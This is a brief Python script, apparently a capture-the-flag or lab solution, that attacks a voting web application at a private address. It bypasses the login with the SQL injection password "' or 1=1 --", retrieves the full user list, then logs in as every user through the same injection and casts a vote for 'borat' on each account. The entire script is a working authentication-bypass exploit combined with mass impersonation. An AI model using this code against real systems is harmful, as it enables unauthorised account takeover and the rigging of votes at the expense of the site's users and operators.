import requests

password = "' or 1=1 --"


with requests.Session() as s:
    s.post("http://10.212.172.46:30001/login", data={"username": "admin", "password": password})
    usernames = s.get("http://10.212.172.46:30001/users").json()
    print(usernames)


for user in usernames:
    with requests.Session() as s:
        s.post("http://10.212.172.46:30001/login", data={"username": user, "password": password})
        s.post("http://10.212.172.46:30001/vote", data={"candidate": "borat"})
